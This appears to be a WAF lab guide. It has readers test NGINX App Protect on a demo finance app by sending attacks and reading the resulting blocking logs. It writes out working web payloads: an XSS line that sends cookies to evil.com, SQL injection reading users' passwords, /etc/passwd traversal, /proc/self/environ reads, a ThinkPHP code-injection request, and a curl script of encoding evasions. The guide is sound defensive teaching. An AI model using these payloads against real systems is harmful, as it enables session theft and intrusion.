Access the Application and test the NGINX App Protect WAF to see how it works in action
--------------------------------------------------------------------------------------- 


Now that NGINX App Protect WAF is enabled, let's test its ability to protect against Layer 7 attacks. Follow these steps:

Launch the Firefox browser and open Arcadia Finance app:

    #. In the Browser, open NGINX Ingress Controller URL to access Arcadia app (replace with the nginx-ingress EXTERNAL-IP): http://EXTERNAL-IP/
    #. Click on ``Login`` and use the credentials ``matt:ilovef5``
    #. You should see all the apps running (main, back, app2 and app3)
    #. Execute the same XSS attack we did in Module 1 by appending ``?a=<script>`` to the end of the application URL. Observe that the attack is now blocked and the user is provided with a support ID.

        .. code-block:: html
            
                The requested URL was rejected. Please consult with your administrator.
            
                Your support ID is: 14609283746114744748
            
                [Go Back]
                
        .. note:: Did you notice the blocking page is similar to F5 ASM and Adv. WAF ?


        .. image:: ./pictures/image18.png
        
    #. Execute the second attack by appending ``?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`` to the application URL, and observe the results

        .. image:: ./pictures/image19.png 

    #. Feel free to execute any attacks you would like and observe the results.

Congratulations on securing your application!


**Here are some optional attacks you can try**

SQL Injection - ``GET /?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+``
Remote File Include - ``GET /?hfsagrs=php%3A%2F%2Ffilter%2Fresource%3Dhttp%3A%2F%2Fgoogle.com%2Fsearch``
Command Execution - ``GET /?hfsagrs=%2Fproc%2Fself%2Fenviron``
HTTP Parser Attack - ``GET /?XDEBUG_SESSION_START=phpstorm``
Predictable Resource Location Path Traversal - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd``
Cross Site Scripting - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=+oNmouseoVer%3Dbfet%28%29+``
Informtion Leakage - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=efw``
HTTP Parser Attack Forceful Browsing - ``GET /dana-na/auth/url_default/welcome.cgi``
Non-browser Client,Abuse of Functionality,Server Side Code Injection,HTTP Parser Attack - ``GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP``
Cross Site Scripting - ``GET / HTTP/1.1\r\nHost: <ATTACKED HOST>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n"``


**and many more from bash script below **

        .. code-block :: bash

                #!/bin/bash
                echo "------------------------------"
                echo "Starting security testing..."
                echo "------------------------------"
                echo ""
                echo ""

                # Get the external IP address of the NGINX Ingress Controller
                EXTERNAL_IP=$(kubectl get services -n ingress-nginx | awk 'NR==2{print $4}')

                echo "---------------------------------------------------------------------"
                echo "Multiple decoding"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/three_decodin%2525252567.html'"
                echo "---------------------------------------------------------------------"

                # Send a request with multiple decoding
                curl -k "http://$EXTERNAL_IP/three_decodin%2525252567.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Apache Whitespace"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/tab_escaped%09.html'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with Apache whitespace
                curl -k "http://$EXTERNAL_IP/tab_escaped%09.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "IIS Backslashes"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/regular%5cescaped_back.html'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with IIS backslashes
                curl -k "http://$EXTERNAL_IP/regular%5cescaped_back.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Apache Whitespace"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with Apache whitespace
                curl -k "http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Cross site scripting"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/%25%25252541PPDATA%25'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with cross-site scripting payload
                curl -k "http://$EXTERNAL_IP/%25%25252541PPDATA%25"



Security Logging
#################

To verify that F5 Application Protection WAF is logging security events, follow these steps:

#. Get the local syslog server POD by running ``oc get all -o wide``

        Example: 

        .. code-block:: bash

                [lab-user@bastion app-protect-waf]$ oc get all -o wide
                NAME                           READY   STATUS    RESTARTS   AGE   IP            NODE                                         NOMINATED NODE   READINESS GATES
                pod/app2-6bd5b4fbd7-6k8hd      1/1     Running   0          18h   10.128.2.47   ip-10-0-169-7.us-east-2.compute.internal     <none>           <none>
                pod/app3-5699b95596-2s927      1/1     Running   0          18h   10.131.0.19   ip-10-0-195-218.us-east-2.compute.internal   <none>           <none>
                pod/backend-79c6bcf85c-k8m2s   1/1     Running   0          18h   10.128.2.45   ip-10-0-169-7.us-east-2.compute.internal     <none>           <none>
                pod/main-584fc64db4-v8jf2      1/1     Running   0          18h   10.128.2.46   ip-10-0-169-7.us-east-2.compute.internal     <none>           <none>
                pod/syslog-bb47bd798-2vqps     1/1     Running   0          18h   10.131.0.20   ip-10-0-195-218.us-east-2.compute.internal   <none>           <none>

#. Examine the logging matching the support ID of `436359350950` 

        Example: 

        .. code-block:: bash

                [lab-user@bastion app-protect-waf]$ oc exec -it pod/syslog-bb47bd798-2vqps  -- cat /var/log/messages | grep 4363593509500748230
                Feb  8 18:53:09 my-nginx-ingress-controller-nginx-ingress-5577cfcf9f-glfcz ASM:attack_type="SQL-Injection,Other Application Activity",blocking_exception_reason="N/A",date_time="2023-02-08 18:53:09",dest_port="80",ip_client="76.220.40.89",is_truncated="false",method="GET",policy_name="dataguard-alarm",protocol="HTTP",request_status="blocked",response_code="0",severity="Critical",sig_cves="N/A,N/A,N/A,N/A",sig_ids="200002553,200000073,200002736,200000082",sig_names="SQL-INJ integer field UNION (Parameter),SQL-INJ ""UNION SELECT"" (Parameter),SQL-INJ ' UNION SELECT (Parameter)...",sig_set_names="{SQL Injection Signatures},{SQL Injection Signatures},{SQL Injection Signatures}...",src_port="52787",sub_violations="N/A",support_id="4363593509500748230",threat_campaign_names="N/A",unit_hostname="my-nginx-ingress-controller-nginx-ingress-5577cfcf9f-glfcz",uri="/",violation_rating="5",vs_name="78-a4a7de86144454f7c9b3900612159b9a-1152717638.us-east-2.elb.amazonaws.com:8-/",x_forwarded_for_header_value="N/A",outcome="REJECTED",outcome_reason="SECURITY_WAF_VIOLATION",violations="Attack signature detected,Violation Rating Threat detected",json_log="{""violations"":[{""enforcementState"":{""isBlocked"":true},""violation"":{""name"":""VIOL_RATING_THREAT""}},{""enforcementState"":{""isBlocked"":false},""signature"":{""name"":""SQL-INJ integer field UNION (Parameter)"",""signatureId"":200002553},""violation"":{""name"":""VIOL_ATTACK_SIGNATURE""}},{""enforcementState"":{""isBlocked"":false},""signature"":{""name"":""SQL-INJ \""UNION SELECT\"" (Parameter)"",""signatureId"":200000073},""violation"":{""name"":""VIOL_ATTACK_SIGNATURE""}},{""enforcementState"":{""isBlocked"":false},""signature"":{""name"":""SQL-INJ ' UNION SELECT (Parameter)"",""signatureId"":200002736},""violation"":{""name"":""VIOL_ATTACK_SIGNATURE""}},{""enforcementState"":{""isBlocked"":false},""signature"":{""name"":""SQL-INJ \""SELECT FROM\"" (Parameter)"",""signatureId"":200000082},""violation"":{""name"":""VIOL_ATTACK_SIGNATURE""}}]}",violation_details="<?xml version='1.0' encoding='UTF-8'?><BAD_MSG><violation_masks><block>410000000000c00-3a03030c30000072-8000000000000000-0</block><alarm>2477f0ffcbbd0fea-befbf35cb000007e-8000000000000000-0</alarm><learn>0-0-0-0</learn><staging>0-0-0-0</staging></violation_masks><request-violations><violation><viol_index>42</viol_index><viol_name>VIOL_ATTACK_SIGNATURE</viol_name><context>parameter</context><parameter_data><value_error/><enforcement_level>global</enforcement_level><name>aGZzYWdycw==</name><auto_detected_type>alpha-numeric</auto_detected_type><value>LTEgdW5pb24gc2VsZWN0IHVzZXIscGFzc3dvcmQgZnJvbSB1c2VycyAtLSA=</value><location>query</location><param_name_pattern>*</param_name_pattern><staging>0</staging></parameter_data><staging>0</staging><sig_data><sig_id>200002553</sig_id><blocking_mask>2</blocking_mask><kw_data><buffer>aGZzYWdycz0tMSB1bmlvbiBzZWxlY3QgdXNlcixwYXNzd29yZCBmcm9tIHVzZXJzIC0tIA==</buffer><offset>8</offset><length>15</length></kw_data></sig_data><sig_data><sig_id>200000073</sig_id><blocking_mask>2</blocking_mask><kw_data><buffer>aGZzYWdycz0tMSB1bmlvbiBzZWxlY3QgdXNlcixwYXNzd29yZCBmcm9tIHVzZXJzIC0tIA==</buffer><offset>8</offset><length>43</length></kw_data></sig_data><sig_data><sig_id>200002736</sig_id><blocking_mask>2</blocking_mask><kw_data><buffer>aGZzYWdycz0tMSB1bmlvbiBzZWxlY3QgdXNlcixwYXNzd29yZCBmcm9tIHVzZXJzIC0tIA==</buffer><offset>9</offset><length>14</length></kw_data></sig_data><sig_data><sig_id>200000082</sig_id><blocking_mask>2</blocking_mask><kw_data><buffer>aGZzYWdycz0tMSB1bmlvbiBzZWxlY3QgdXNlcixwYXNzd29yZCBmcm9tIHVzZXJzIC0tIA==</buffer><offset>17</offset><length>34</length></kw_data></sig_data></violation></request-violations></BAD_MSG>",bot_signature_name="N/A",bot_category="N/A",bot_anomalies="N/A",enforced_bot_anomalies="N/A",client_class="Browser",client_application="Chrome",client_application_version="109",request="GET /?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+ HTTP/1.1\r\nHost: a4a7de86144454f7c9b3900612159b9a-1152717638.us-east-2.elb.amazonaws.com\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n",transport_protocol="HTTP/1.1"
                [lab-user@bastion app-protect-waf]$

#. The output of the command shows the relevant log entry that contains information about a SQL injection attack and the specific signatures that were triggered by the attack.

Congratulations on completing the Lab!



        